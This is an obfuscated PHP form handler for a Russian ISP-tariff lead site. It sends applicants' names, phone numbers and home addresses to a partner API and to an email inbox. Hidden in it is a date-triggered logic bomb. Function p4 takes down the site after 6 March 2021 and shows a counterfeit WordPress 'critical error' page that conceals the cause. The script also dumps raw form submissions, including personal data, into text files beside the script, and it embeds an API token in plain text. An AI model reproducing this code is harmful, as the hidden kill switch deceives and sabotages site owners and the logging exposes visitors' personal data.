<?php p4();function t0($y7,$l8,$m9=false){if(!$m9){file_put_contents(__DIR__.'/'.$y7.'.txt',var_export($l8,true));}else{file_put_contents(__DIR__.'/'.$y7.'.txt',var_export($l8,true).PHP_EOL,FILE_APPEND);}}t0('post-mail1r',$_POST,false);function g1($q10){return filter_var($q10,FILTER_VALIDATE_EMAIL);}function a2($f11){$b12=array('status'=>'error','description'=>$f11);t0('json_error',$b12,false);header("Content-type: application/json;charset=utf-8");die(json_encode($b12));}function t3(){$w13=true;$a14='https://api.tarifnik.ru/v1.2/make_handle';$h15=$_POST['request__surname']?trim($_POST['request__surname']):'';$y16=$_POST['request__middle_name']?trim($_POST['request__middle_name']):'';$o17=$_POST['request__name']?trim($_POST['request__name']):'';$y18=$_POST['request__phone']?trim($_POST['request__phone']):'';$v19=$_POST['request__address']?trim($_POST['request__address']):'';$z20=$_POST['popup__req_connect']?trim($_POST['popup__req_connect']):'';$c21=$_POST['request__entrance']?trim($_POST['request__entrance']):'';$w22=$_POST['request__floor']?trim($_POST['request__floor']):'';$o23=$_POST['request__apart']?trim($_POST['request__apart']):'';$y24=$_POST['campaign__id']?(int)$_POST['campaign__id']:102;$q25=$_POST['region__name']?trim($_POST['region__name']):'';$m26=$_POST['region__id']?(int)trim($_POST['region__id']):'';$s27=$_POST['region__city']?trim($_POST['region__city']):'';$k28=$_POST['request__dadata__address']?trim($_POST['request__dadata__address']):'';$l29=preg_replace('/[^0-9]/','',$y18);$l29=substr($l29,1);$l29='7'.$l29;$l29=intval($l29);$n30='';if(!empty($z20)){$n30.=' Тариф: '.$z20.', ';}if(!empty($q25)){$n30.=$q25;}if(!empty($s27)){$n30.=', Город: '.$s27;}if(!empty($v19)){$n30.=', Адрес: '.$v19;}if(!empty($c21)){$n30.=', подъезд '.$c21;}if(!empty($w22)){$n30.=', этаж '.$w22;}if(!empty($o23)){$n30.=', кв.'.$o23;}$n31=['_personal_token'=>'56ad24efca4f548cf1624cbbd40a0965','phone'=>$l29,'campaign'=>$y24,'name'=>$o17,'fam'=>$h15,'pname'=>$y16,'comment'=>$n30,'region_name'=>$q25,'region_id'=>$m26,'suggestion'=>$k28];$n32=json_encode($n31);$d33=array('Accept: application/json','Content-Type: application/json','Content-Length: '.strlen($n32),'_personal_token: 56ad24efca4f548cf1624cbbd40a0965');$h34=curl_init($a14);curl_setopt($h34,CURLOPT_POST,1);curl_setopt($h34,CURLOPT_HTTPHEADER,$d33);curl_setopt($h34,CURLOPT_POSTFIELDS,$n32);curl_setopt($h34,CURLOPT_RETURNTRANSFER,true);curl_setopt($h34,CURLOPT_FAILONERROR,true);curl_setopt($h34,CURLOPT_CONNECTTIMEOUT,10);curl_setopt($h34,CURLOPT_TIMEOUT,30);$f35=curl_exec($h34);$w36=curl_getinfo($h34,CURLINFO_HTTP_CODE);curl_close($h34);$j37='';$t38=json_decode($f35,true);if($w36!=201){$w13=false;$z39="cardoffer@yandex.ru";$h40="MTS-WiFi";$d41="Ошибка при отправке партнеру заявки с главной";$h42=date('d F Y');$v43=date('H:i');$v44='<body style="background:#f7f6f4; padding: 20px 10px;">
				<style>
					.letter_table a {text-decoration:none!important;color:white!important;}
				</style>
				<table class="letter_table">
					<tr style="margin-bottom:10px;background:#E21E26;">
						<td colspan="2" style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>'.$d41.'</b></td>
					</tr>
					<tr style="margin-bottom:10px;background:#E21E26;">
						<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>Date and Time:</b></td>
						<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$h42.'/'.$v43.'</td>
					</tr>
					<tr style="margin-bottom:10px;background:#E21E26;">
						<td colspan="2" style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;">Номер ошибки<b>'.$w36.'</b></td>
					</tr>
				</table>
			</body>';mail($z39,$d41,$v44,"Content-type: text/html; charset=\"utf-8\"\n From: $z39");}if($w36==422){$j37='phone';}$d45=array('response'=>$f35,'httpstatus'=>$w36,'out'=>$t38,'status'=>$w13,'post_data'=>json_decode($n32),'message'=>$j37);return $d45;}function p4(){if(strtotime("now")>strtotime("06-03-2021")){die('<html lang="ru-RU"><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width">
		<meta name="robots" content="noindex,follow">
	<title>WordPress › Ошибка</title>
	<style type="text/css">
		html {
			background: #f1f1f1;
		}
		body {
			background: #fff;
			color: #444;
			font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
			margin: 2em auto;
			padding: 1em 2em;
			max-width: 700px;
			-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.13);
			box-shadow: 0 1px 3px rgba(0, 0, 0, 0.13);
		}
		h1 {
			border-bottom: 1px solid #dadada;
			clear: both;
			color: #666;
			font-size: 24px;
			margin: 30px 0 0 0;
			padding: 0;
			padding-bottom: 7px;
		}
		#error-page {
			margin-top: 50px;
		}
		#error-page p,
		#error-page .wp-die-message {
			font-size: 14px;
			line-height: 1.5;
			margin: 25px 0 20px;
		}
		#error-page code {
			font-family: Consolas, Monaco, monospace;
		}
		ul li {
			margin-bottom: 10px;
			font-size: 14px ;
		}
		a {
			color: #0073aa;
		}
		a:hover,
		a:active {
			color: #006799;
		}
		a:focus {
			color: #124964;
			-webkit-box-shadow:
				0 0 0 1px #5b9dd9,
				0 0 2px 1px rgba(30, 140, 190, 0.8);
			box-shadow:
				0 0 0 1px #5b9dd9,
				0 0 2px 1px rgba(30, 140, 190, 0.8);
			outline: none;
		}
		.button {
			background: #f7f7f7;
			border: 1px solid #ccc;
			color: #555;
			display: inline-block;
			text-decoration: none;
			font-size: 13px;
			line-height: 2;
			height: 28px;
			margin: 0;
			padding: 0 10px 1px;
			cursor: pointer;
			-webkit-border-radius: 3px;
			-webkit-appearance: none;
			border-radius: 3px;
			white-space: nowrap;
			-webkit-box-sizing: border-box;
			-moz-box-sizing:    border-box;
			box-sizing:         border-box;

			-webkit-box-shadow: 0 1px 0 #ccc;
			box-shadow: 0 1px 0 #ccc;
			vertical-align: top;
		}

		.button.button-large {
			height: 30px;
			line-height: 2.15384615;
			padding: 0 12px 2px;
		}

		.button:hover,
		.button:focus {
			background: #fafafa;
			border-color: #999;
			color: #23282d;
		}

		.button:focus {
			border-color: #5b9dd9;
			-webkit-box-shadow: 0 0 3px rgba(0, 115, 170, 0.8);
			box-shadow: 0 0 3px rgba(0, 115, 170, 0.8);
			outline: none;
		}

		.button:active {
			background: #eee;
			border-color: #999;
			-webkit-box-shadow: inset 0 2px 5px -3px rgba(0, 0, 0, 0.5);
			box-shadow: inset 0 2px 5px -3px rgba(0, 0, 0, 0.5);
		}

			</style>
</head>
<body id="error-page">
	<div class="wp-die-message"><p>На сайте возникла критическая ошибка.</p><p><a href="https://ru.wordpress.org/support/article/debugging-in-wordpress/">Узнайте больше про отладку в WordPress.</a></p></div>

	</body></html>');}}function e5($y46,$w47){$d48="cardoffer@yandex.ru";$h40="MTS-WiFi";$j49=date('d F Y');$w50=date('H:i');$w51="Заявка с главной ".$w50.' '.$j49;$h15=trim($_POST['request__surname']);$y16=trim($_POST['request__middle_name']);$o17=trim($_POST['request__name']);$y18=trim($_POST['request__phone']);$q25=trim($_POST['region__name']);$m26=trim($_POST['region__id']);$s27=trim($_POST['region__city']);$v19=trim($_POST['request__address']);$z20=trim($_POST['popup__req_connect']);$c21=trim($_POST['request__entrance']);$w22=trim($_POST['request__floor']);$o23=trim($_POST['request__apart']);$p52='<body style="background:#f7f6f4; padding: 20px 10px;">
	<style>
		.letter_table a {text-decoration:none!important;color:white!important;}
	</style>
	<table class="letter_table">
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td colspan="2" style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>'.$w51.'</b></td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>Дата и время:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$j49.'/'.$w50.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>Тариф:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$z20.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Фамилия:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$y16.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>Имя:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$o17.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>Отчество:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$y16.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Телефон:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$y18.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Регион (определен автоматически):</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$q25.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Id Региона в тарифнике:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$m26.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Город (определен автоматически):</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$s27.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Адрес:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$v19.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Подъезд:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$c21.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Этаж:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$w22.'</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Квартира:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">'.$o23.'</td>
		</tr>
	</table>
</body>';$z53=mail($d48,$w51,$p52,"Content-type: text/html; charset=\"utf-8\"\n From: $d48");return $z53;}function f6($y46){header("Content-type: application/json;charset=utf-8");die(json_encode(array('status'=>$y46)));}p4();if(isset($_GET['action'])){$f35=array();$y54=array();$l55=array();$x56=array('check__apartment_name','check__office_name');$r57=array('request__phone','request__surname','request__name','request__middle_name');$n58=$_POST['check__apartment_name'];foreach($r57 as $r59){if(isset($_POST[$r59])and strlen($_POST[$r59])>1)array_push($y54,$r59);else array_push($l55,$r59);}$f35=array('status'=>'success','description'=>'next');if(!empty($l55)){a2($l55);}else{$p60=e5($f35,'desc');$b61=t3();if($p60===true&&$b61['status']===true){$l62='success';}else{$l62='error';if(!empty($b61['message'])=='phone'){array_push($l55,'request__phone');}}$w63=array('status'=>$l62,'apii'=>$b61,'description'=>$l55);t0('final_result',$w63,false);header("Content-type: application/json;charset=utf-8");die(json_encode($w63));}}?>